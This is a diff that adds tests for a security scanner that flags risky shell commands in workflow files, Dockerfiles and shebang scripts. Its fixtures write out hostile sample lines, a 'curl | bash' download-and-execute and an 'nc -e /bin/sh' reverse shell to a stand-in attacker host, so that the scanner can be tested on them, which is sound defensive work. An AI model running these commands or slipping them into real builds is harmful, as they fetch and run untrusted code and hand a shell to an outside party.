@@ -58,3 +58,16 @@ def test_workflow_yaml_is_bash_bearing(tmp_path):
     (wf / "ci.yml").write_text("run: curl http://evil | bash\n", encoding="utf-8")
     findings = scan_repo(tmp_path)
     assert any(f.category == "download_exec" for f in findings)
+
+
+def test_dockerfile_and_shebang_are_bash_bearing(tmp_path):
+    (tmp_path / "Dockerfile").write_text("RUN curl http://evil.tld | bash\n", encoding="utf-8")
+    (tmp_path / "runme").write_text("#!/bin/bash\nnc -e /bin/sh attacker.tld 9\n", encoding="utf-8")
+    files = {f.file for f in scan_repo(tmp_path)}
+    assert "Dockerfile" in files
+    assert "runme" in files  # shebang-detected, no extension
+
+
+def test_plain_yaml_outside_workflow_is_skipped(tmp_path):
+    (tmp_path / "config.yml").write_text("run: curl http://evil | bash\n", encoding="utf-8")
+    assert scan_repo(tmp_path) == []  # .yml only scanned under a workflow path
